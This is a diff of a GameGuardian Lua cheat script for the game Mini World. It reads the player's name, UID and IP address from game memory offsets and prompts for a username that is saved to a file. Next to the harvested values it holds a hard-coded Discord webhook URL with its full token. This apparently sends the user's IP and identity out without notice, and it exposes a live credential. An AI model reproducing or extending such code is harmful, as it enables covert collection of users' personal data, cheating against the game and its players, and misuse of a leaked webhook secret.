@@ -11,6 +11,7 @@ local targetBuild = 67339
 local processes = gg.getListItems()
 local gameProcess = nil
 local gameProcessName = "mini world" 
+local username = ""
 local publicbase = "liblibGameApp.so:bss"
 local player_data_adress = 0x42FB8
 APP = gg.getTargetInfo()
@@ -362,16 +363,16 @@ end
 function checkplayerdata()
 local t = {publicbase, "Cb"}
 local tt = {player_data_adress, 0x49}
-local ttt = S_Pointer(t, tt, true)
-Myname = readString(ttt, 64)
+local tttrr = S_Pointer(t, tt, true)
+Myname = readString(tttrr, 64)
 local t = {publicbase, "Cb"}
 local tt = {player_data_adress, 0x8}
-local ttt = S_Pointer(t, tt, true)
-Myuid = GetValue(ttt,4)
+local tttdd = S_Pointer(t, tt, true)
+Myuid = GetValue(tttdd,4)
 local t = {publicbase, "Cb"}
 local tt = {0x43F9C0, 0x2E}
-local ttt = S_Pointer(t, tt, true)
-MyIPv4 = readString(ttt,12)
+local tttyy = S_Pointer(t, tt, true)
+MyIPv4 = readString(tttyy,12)
 end
 
 gg.sleep(100)
@@ -381,7 +382,6 @@ local user_name = username
 local player_name = Myname
 local player_uid = Myuid
 local myIPAddress = MyIPv4
-
 local webhook_url = "https://discord.com/api/webhooks/1293219977096073319/32svVajM7yY925l54bUIOCXSWGMRN6gZAlORdLEqmSFrCznr6SFFALme25t5u4V3fSy2"
 if not player_name then
     player_name = "nil"
@@ -3206,7 +3206,7 @@ end
 
 local hostitemsaveFilePath = gg.getFile() .. "_host_items_saved_data.txt"
 -- 函數：保存數據到文件
-local function hostitemssaveData(hostitemdata)
+function hostitemssaveData(hostitemdata)
     local file = io.open(hostitemsaveFilePath, "w")
     if file then
         file:write(table.concat(hostitemdata, ","))
@@ -3977,7 +3977,8 @@ CAbox({
 },
 })
 end
-running = false
+
+local running = false
 function dologin()
 running = true
 while running do
@@ -4006,7 +4007,7 @@ end
 end
 
 
-local SkyCapoofilename = gg.getFile():gsub("%.lua$", "_Skyusername.txt") -- 保存用戶名的文件名
+local SkyCapoofilename = gg.getFile() .. "_Skyusername.txt" -- 保存用戶名的文件名
 function SkyCapoofileExists(name)
   local file = io.open(name, "r")
   if file then
@@ -4017,16 +4018,15 @@ function SkyCapoofileExists(name)
   end
 end
 
-
+function gameloging()
 -- 第一次運行時，提示用戶輸入名稱
 if not SkyCapoofileExists(SkyCapoofilename) then
-  loguser = gg.prompt({"請設定用戶名稱"}, {[1] = "User"}, {[1] = "text"})
+  local loguser = gg.prompt({"請設定用戶名稱"}, {[1] = "User"}, {[1] = "text"})
   if loguser and loguser[1] ~= "" then
-    assfile = io.open(SkyCapoofilename, "w")
+    local assfile = io.open(SkyCapoofilename, "w")
     assfile:write(loguser[1])
     assfile:close()
     gg.toast("用戶名稱已設定: " .. loguser[1])
-    gg.sleep(500)
     username = loguser[1]
     gg.toast("歡迎使用, 用戶: " .. username)
     dologin()
@@ -4036,13 +4036,14 @@ if not SkyCapoofileExists(SkyCapoofilename) then
   end
 else
   -- 文件存在時，自動讀取用戶名稱
-  assfile = io.open(SkyCapoofilename, "r")
-   username = assfile:read("*a")
+  local assfile = io.open(SkyCapoofilename, "r")
+  username = assfile:read("*a")
   assfile:close()
   gg.toast("歡迎使用, 用戶: " .. username)
   dologin()
 end
-
+end
+gameloging()
 
 Lock.Ui(invoke, nil, function(err) print(err) end)
 --os.exit()停止腳本
